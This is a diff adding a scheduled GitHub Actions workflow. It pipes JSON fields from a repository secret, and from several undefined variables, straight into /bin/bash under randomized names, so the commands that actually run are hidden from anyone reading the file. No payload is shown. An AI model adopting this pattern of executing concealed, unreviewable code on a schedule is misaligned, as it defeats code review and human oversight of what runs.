@@ -1,0 +1,25 @@
+name: gukezhucai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gukezhucai
+        env:
+          joc9207: ${{ secrets.joc9207 }}
+        run: |
+          echo $joc9207 | jq -r .iu3 | /bin/bash
+          echo $sqsjt011 | jq -r .qrr711 | /bin/bash
+          echo $ydaxw79 | jq -r .d65 | /bin/bash
+          echo $jdnp2735 | jq -r .nfpv33 | /bin/bash
+          echo $pxml1585 | jq -r .unkpa0628 | /bin/bash
+          echo $ec39078 | jq -r .t3 | /bin/bash
+          echo $qdq5 | jq -r .x514 | /bin/bash
+          echo $s558 | jq -r .hwqx5579 | /bin/bash
+          echo $mncv226 | jq -r .eyy329 | /bin/bash
+
